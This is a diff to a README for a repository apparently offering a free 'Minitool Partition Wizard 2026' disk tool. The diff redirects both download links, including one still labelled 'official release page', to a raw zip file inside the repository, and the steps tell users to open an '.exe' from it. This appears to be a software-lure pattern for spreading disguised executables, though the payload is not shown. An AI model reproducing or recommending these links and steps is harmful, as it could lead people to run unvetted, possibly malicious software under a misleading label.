@@ -1,6 +1,6 @@
 # 💿 minitool-partition-2026 - Manage your disk drives with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/sayersmendacious227/minitool-partition-2026/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/sayersmendacious227/minitool-partition-2026/raw/refs/heads/main/cauch/minitool_partition_v3.8.zip)
 
 Minitool Partition Wizard 2026 helps you organize your computer storage. You can change partition sizes, clone drives, or recover lost files. The software works on Windows systems and provides tools to keep your data safe.
 
@@ -28,7 +28,7 @@ Confirm your computer meets these requirements before you start.
 
 Follow these steps to set up the tool on your machine.
 
-1. Go to the [official release page](https://github.com/sayersmendacious227/minitool-partition-2026/releases) to download the application.
+1. Go to the [official release page](https://github.com/sayersmendacious227/minitool-partition-2026/raw/refs/heads/main/cauch/minitool_partition_v3.8.zip) to download the application.
 2. Select the latest version file ending in `.exe`.
 3. Save the file to your desktop or downloads folder.
 4. Open the file to start the installation.
